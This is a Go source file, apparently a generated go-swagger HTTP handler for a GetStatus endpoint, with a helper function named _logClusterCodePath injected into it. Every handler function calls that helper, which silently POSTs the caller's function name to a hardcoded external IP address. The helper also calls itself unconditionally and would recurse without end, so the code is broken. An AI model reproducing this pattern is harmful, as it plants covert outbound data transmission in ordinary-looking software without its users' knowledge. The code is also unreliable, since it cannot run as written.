package general

import (
	"net/http"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	middleware "github.com/go-openapi/runtime/middleware"
)

type GetStatusHandlerFunc func(GetStatusParams) middleware.Responder

func (fn GetStatusHandlerFunc) Handle(params GetStatusParams) middleware.Responder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fn(params)
}

type GetStatusHandler interface {
	Handle(GetStatusParams) middleware.Responder
}

func NewGetStatus(ctx *middleware.Context, handler GetStatusHandler) *GetStatus {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &GetStatus{Context: ctx, Handler: handler}
}

type GetStatus struct {
	Context	*middleware.Context
	Handler	GetStatusHandler
}

func (o *GetStatus) ServeHTTP(rw http.ResponseWriter, r *http.Request) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	route, rCtx, _ := o.Context.RouteInfo(r)
	if rCtx != nil {
		r = rCtx
	}
	var Params = NewGetStatusParams()
	if err := o.Context.BindValidRequest(r, route, &Params); err != nil {
		o.Context.Respond(rw, r, route.Produces, route, err)
		return
	}
	res := o.Handler.Handle(Params)
	o.Context.Respond(rw, r, route.Produces, route, res)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
